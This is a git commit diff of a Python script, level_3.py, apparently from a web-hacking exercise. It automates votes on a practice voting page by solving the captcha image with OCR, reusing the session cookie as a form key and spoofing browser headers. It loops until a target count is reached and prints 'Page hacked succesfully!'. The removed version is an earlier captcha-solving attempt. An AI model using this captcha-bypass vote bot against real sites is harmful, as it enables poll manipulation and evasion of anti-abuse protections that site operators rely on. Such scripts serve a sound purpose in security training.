dab0aa9b445e8d7799a911e36929bce12c6500f1
toshi-uy <s_borgia@hotmail.com>
2021-06-06 15:45:35 -0300

    added file and test file

--- level_3/level_3.py
+++ level_3/level_3.py
@@ -1,65 +1,63 @@
-#!/usr/bin/env python
-"""Python script to cheat on website"""
-
-from http import cookiejar
-from pathlib import Path
-import sys
-import mechanize
-import http.cookiejar as cookiejar
-from PIL import Image, ImageOps, ImageEnhance
+#!/usr/bin/python3
 import requests
-import io
-import os
-import hashlib
-from subprocess import check_output
 from bs4 import BeautifulSoup
 import pytesseract
+import urllib.request
+from PIL import Image
 
-def resolve(path):
-	print("Resampling the Image")
-	check_output([path, '-resample', '600', path])
-	return pytesseract.image_to_string(Image.open(path))
+URL = "http://158.69.76.135/level3.php"
+vote_id = "2785"
+session = requests.Session()
+goal = 2
 
-# Open Browser and getting cookies
-br = mechanize.Browser()
-cookiejar = cookiejar.LWPCookieJar() 
-br.set_cookiejar(cookiejar)
+def hack():
+    headers = {
+        'Referer': 'http://158.69.76.135/level3.php',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
+    }
 
-# Handling things on browser
-br.set_handle_equiv(True)
-br.set_handle_redirect(True)
-br.set_handle_referer(True)
-br.set_handle_robots(False)
+    data = {
+        'id': vote_id,
+        'key':'',
+        'captcha':'',
+        'holdthedoor':'Submit'
+    }
 
-# Adding headers
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
-br.addheaders = [('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+    response = session.get(URL)
+    soup = BeautifulSoup(response.text, "html.parser")
+    image = session.get('http://158.69.76.135/captcha.php')
 
-# Opening page
-br.open("http://158.69.76.135/level3.php")
+    file = open("captcha.png", "wb")
+    file.write(image.content)
+    file.close()
 
-# Resolve captcha
-URL = "http://158.69.76.135/captcha.php"
-try:
-    page = requests.get(URL).content
-except:
-    print(f"ERROR - Could not download {URL} - {e}")
-try:
-        image_file = io.BytesIO(page)
-        image = Image.open(image_file).convert('RGB')
-        file_path = os.path.join("level_3/captchas",hashlib.sha1(page).hexdigest()[:10] + '.jpg')
-        with open(file_path, 'wb') as f:
-            image.save(f, "JPEG", quality=85)
-        print(f"SUCCESS - saved {URL} - as {file_path}")
-        captcha_text = resolve(file_path)
-        print('Extracted Text',captcha_text)
-except Exception as e:
-    print(f"ERROR - Could not save {URL} - {e}")
+    captcha = pytesseract.image_to_string("captcha.png")
+    data['captcha'] = captcha[0:4]
 
+    dict = session.cookies.get_dict()
+    data['key'] = dict['HoldTheDoor']
+    
+    page = session.post(URL, data=data, headers=headers)
 
+    vote_nb = soup.select_one('tr:-soup-contains("2785")')
+    vote_nb = vote_nb.findAll('td')[1].text
+    vote_nb = int(vote_nb)
 
-# for i in range(1023):
-#     br.select_form(nr=0)
-#     br.form["id"] = "2785"
-#     br.submit()
-print("Done!")
+    if page and "hacker" not in page.text:
+        print("Page hacked succesfully!")
+        session.cookies.clear()
+        return vote_nb
+    else:
+        print("Failed to hack the page...\n")
+        session.cookies.clear()
+        return -1
+
+def main():
+    res = 0
+    while res != goal:
+        res = hack() + 1
+        if res != 0:
+            print("Vote number: {}\n======".format(res))
+
+if __name__ == '__main__':
+    main()
